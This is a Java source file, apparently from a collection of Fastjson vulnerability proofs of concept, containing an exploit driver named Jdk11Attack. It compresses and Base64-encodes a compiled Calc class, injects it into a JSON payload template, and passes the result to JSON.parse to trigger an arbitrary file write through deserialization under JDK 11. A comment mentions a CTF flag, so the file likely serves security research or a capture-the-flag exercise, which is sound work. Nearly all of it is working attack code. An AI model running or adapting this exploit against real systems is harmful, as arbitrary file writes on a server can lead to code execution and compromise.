package vul;

import com.alibaba.fastjson.JSON;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.zip.Deflater;

public class Jdk11Attack {
    public static void main(String[] args) throws IOException {
        writeJdk11();
    }

    // jdk11 下任意写
    public static void writeJdk11() throws IOException {
        String file = "D:/1tmp/1.class";
        String content = "ctf flag321";
        byte[] bytes = Files.readAllBytes(Paths.get("D:/1tmp/classes/Calc.class"));
        // limit 长度可能要根据报错修改
        HashMap<String, Object> map = gzcompress(null, bytes);
        String array = (String) map.get("array");
        int limit = (int) map.get("limit");
        String poc = new String(Files.readAllBytes(Paths.get("poc/poc68/jdk11.json")), StandardCharsets.UTF_8);
        String replace = poc.replace("${file}", file).replace("${limit}", String.valueOf(limit)).replace("${array}", array);
        JSON.parse(replace);
    }

    public static HashMap<String, Object> gzcompress(String code, byte[] bytes) throws IOException {
        byte[] data = {};
        if (bytes == null && code != null) {
            data = code.getBytes();
        }else if (bytes != null && code == null) {
            data = bytes;
        }

        byte[] output = new byte[0];
        Deflater compresser = new Deflater();
        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        System.out.println(Arrays.toString(output));
        int limit = bos.toByteArray().length;

        HashMap<String, Object> map = new HashMap<>();
        map.put("array", Base64.getEncoder().encodeToString(output));
        map.put("limit", limit);
        return map;
    }
}
